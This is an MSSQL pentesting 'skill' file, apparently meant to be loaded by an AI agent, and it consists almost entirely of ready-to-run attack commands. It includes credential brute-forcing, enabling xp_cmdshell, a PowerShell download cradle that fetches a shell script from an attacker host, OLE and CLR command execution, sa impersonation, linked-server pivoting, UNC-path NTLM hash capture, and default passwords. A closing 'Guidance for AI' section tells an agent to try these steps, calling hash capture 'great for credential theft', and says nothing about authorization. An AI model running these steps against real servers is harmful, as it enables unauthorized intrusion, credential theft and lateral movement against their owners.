# MSSQL Pentesting Skill

## Goal

Enumerate and exploit Microsoft SQL Server to extract data, execute commands, and escalate privileges in Windows environments.

## Methodology

1. **Discovery**: Identify MSSQL services and version
2. **Authentication Testing**: Check for default/weak credentials and Windows authentication
3. **Enumeration**: List databases, tables, users, linked servers
4. **Command Execution**: Use xp_cmdshell, OLE automation, CLR assemblies
5. **Lateral Movement**: Exploit linked servers and trusts
6. **Privilege Escalation**: Impersonate users, exploit misconfigurations

## Tools

* **sqlcmd**: Microsoft SQL Server client
* **sqsh**: Linux SQL Server client
* **impacket-mssqlclient**: Python MSSQL client
* **nmap**: MSSQL scripts
* **PowerUpSQL**: PowerShell SQL audit toolkit
* **CrackMapExec**: Network pentesting tool

## Example Commands

```bash
# Nmap enumeration
nmap -p1433 --script ms-sql-* target
nmap -p1433 --script ms-sql-info target
nmap -p1433 --script ms-sql-empty-password target
nmap -p1433 --script ms-sql-brute target

# Connect with impacket
impacket-mssqlclient user:password@target
impacket-mssqlclient domain/user:password@target -windows-auth

# Connect with sqsh
sqsh -S target -U sa -P password

# Bruteforce
hydra -l sa -P /usr/share/wordlists/rockyou.txt target mssql
crackmapexec mssql target -u users.txt -p passwords.txt
```

## MSSQL Enumeration

```sql
-- Version
SELECT @@version;

-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Server name
SELECT @@SERVERNAME;

-- Current database
SELECT DB_NAME();

-- List databases
SELECT name FROM master.sys.databases;

-- List tables
SELECT * FROM information_schema.tables;
SELECT name FROM sysobjects WHERE xtype='U';

-- List columns
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name='users');

-- List users
SELECT name FROM master.sys.server_principals;
SELECT * FROM sys.syslogins;

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Current user's permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

## Command Execution

### xp_cmdshell (Easiest Method)

```sql
-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"';

-- With impacket
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### OLE Automation

```sql
-- Enable OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute commands via OLE
DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "whoami > C:\temp\out.txt"';
```

### CLR Assembly

```sql
-- Enable CLR
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Set TRUSTWORTHY
ALTER DATABASE master SET TRUSTWORTHY ON;

-- Create assembly from DLL (hex encoded)
CREATE ASSEMBLY [shell] FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;

-- Create function
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME [shell].[StoredProcedures].[cmdExec];

-- Execute
EXEC cmdExec 'whoami';
```

## File Operations

```sql
-- Read files using OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) as x;

-- Read with OLE
DECLARE @file INT;
EXEC sp_oacreate 'scripting.filesystemobject', @file OUT;
EXEC sp_oamethod @file, 'opentextfile', @file OUT, 'C:\test.txt', 1;
```

## Privilege Escalation

```sql
-- Impersonate another user
SELECT * FROM sys.server_permissions WHERE type = 'IM';
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- Get login token
SELECT * FROM sys.login_token;

-- Service account often has high privileges
-- Check if running as SYSTEM or high-priv service account
```

## Linked Server Attacks

```sql
-- Enumerate linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Execute query on linked server
SELECT * FROM OPENQUERY("linkedserver", 'SELECT @@version');
EXEC ('xp_cmdshell ''whoami''') AT [linkedserver];

-- Chain through multiple linked servers
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [server2]') AT [server1];
```

## NTLM Hash Capture

```sql
-- Force MSSQL to authenticate to attacker
-- Start responder or ntlmrelayx first!

EXEC master..xp_dirtree '\\attacker\share';
EXEC master..xp_fileexist '\\attacker\share\file';
EXEC master..xp_subdirs '\\attacker\share';
```

## Metasploit Modules

```bash
# Enumeration
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum

# Command execution
use exploit/windows/mssql/mssql_payload
use auxiliary/admin/mssql/mssql_exec

# Hash capture
use auxiliary/admin/mssql/mssql_ntlm_stealer

# CLR payload
use exploit/windows/mssql/mssql_clr_payload
```

## PowerUpSQL Commands

```powershell
# Discovery
Get-SQLInstanceDomain
Get-SQLInstanceLocal
Get-SQLInstanceBroadcast

# Login testing
Get-SQLConnectionTestThreaded -Instance "target" -Threads 10

# Enumeration
Get-SQLServerInfo -Instance "target"
Get-SQLDatabase -Instance "target"
Get-SQLTable -Instance "target" -Database "master"

# Privilege escalation
Invoke-SQLEscalatePriv -Instance "target"

# Command execution
Invoke-SQLOSCmd -Instance "target" -Command "whoami"
```

## Default Credentials

| Username | Password |
|----------|----------|
| sa | (empty) |
| sa | sa |
| sa | password |
| sa | Password123 |

## Guidance for AI

* Activate this skill when user wants to test MSSQL security or exploit SQL Server databases
* **Try sa account first** - often has weak password or is empty
* Use Windows authentication when domain credentials available: `impacket-mssqlclient domain/user:pass@target -windows-auth`
* xp_cmdshell is the easiest RCE - try to enable it
* NTLM hash capture via UNC path is great for credential theft
* Linked servers are often trusted and can be abused for lateral movement
* PowerUpSQL is excellent for comprehensive SQL Server auditing
* SQL Server service account often runs as SYSTEM or high privilege user
* Check for impersonation rights - may allow privilege escalation
